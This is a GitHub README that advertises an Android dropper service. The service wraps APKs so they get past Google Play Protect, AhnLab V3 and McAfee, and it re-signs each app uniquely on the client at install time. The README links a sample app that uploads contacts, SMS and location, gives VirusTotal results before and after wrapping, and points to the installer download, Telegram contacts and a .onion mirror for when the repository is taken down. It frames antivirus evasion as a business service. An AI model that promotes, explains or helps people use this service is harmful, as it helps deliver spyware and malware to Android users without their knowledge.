# Google Play Protect Bypass (Android Virus Scan Bypass)

安卓报毒解决方案 [中文说明](./README_CN.md)

## Introduction

We completely understand that an overly ambitious security scan engine can be a challenge for your business, especially in today’s digital landscape where all types of apps need room to thrive. Whether it was an accident or not, we're here to provide you with the right solutions.

> ![example of a detected app](./assets/detected.png)

## How does it work?

To tackle this issue, we process your apk file *on the client side* each time it’s installed. This ensures that each app is installed with a completely unique signature while significantly reducing the server load. Our solution relies on minimal reflection and primarily uses public APIs, ensuring it runs smoothly on most devices with recent versions of Android.

## Tested Security Engines

Our solution is tested on real devices to bypass scans from the following security engines:

- Google Play Protect

- Ahnlab V3

- Mcafee

It will likely work well with other engines, as shown below. Feel free to contact us for a free trial of our installer and try it out yourself.

## An Example

We developed an app ([link](https://github.com/android-security-scan-bypass/android-security-scan-bypass-pub/releases/download/v1.0.0/original.apk)) that simulates common malicious operations, such as reading and uploading sensitive information like contacts, SMS, and geolocation. It's been flagged by some security engines, and you can view the VirusTotal scan results [here](https://www.virustotal.com/gui/file/9b3c0e7b7bb015aaa8635c2e37208d6c406e5b5d631b994f5811932374da9cb5). After embedding the original apk inside our installer, the base apk passes all checks ([VirusTotal](https://www.virustotal.com/gui/file/58ba4b98bb43ee953ef9fdb02bcc9594b368fe83963b1975130ba58a5112317e)). And you can download [the installer](https://github.com/android-security-scan-bypass/android-security-scan-bypass-pub/releases/download/v1.0.0/protected-installer.apk) and try it on your own devices. 

Complete screen recording demonstrating this process: 

https://github.com/user-attachments/assets/9a74b45e-f142-442e-b5d1-4c8033cd712d

## Contact us

- **Recommended:** [Website](https://android-dropper.pages.dev/)
- [Telegram bot](https://t.me/protect_bypass_bot)
- [Telegram Channel](https://t.me/bypass_offical)


```

## Notice

If this GitHub repository is taken down, you can check out our website hosted on tor network for the latest updates.

- ```
  http://bypass7vckrcx6e3655el3a74236ixvxwtivhqirdh6rmrtaqvwzjqyd.onion/
  ```
